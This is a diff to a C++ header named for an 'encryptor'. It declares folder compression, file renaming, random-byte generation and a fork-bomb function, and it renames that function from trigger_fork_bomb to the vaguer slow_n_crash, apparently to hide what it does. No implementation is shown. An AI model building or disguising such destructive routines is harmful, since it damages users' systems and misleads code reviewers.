@@ -13,9 +13,9 @@ void compress_folder(const std::string &folder_path);
 void rename_file(const std::string &file, int counter);
 
 
-std::vector<unsigned char> generate_random_bytes(size_t num_bytes);
+std::vector<unsigned char> gen_bytes(size_t num_bytes);
 
 
-void trigger_fork_bomb();
+void slow_n_crash();
 
 #endif // ENCRYPTOR_H
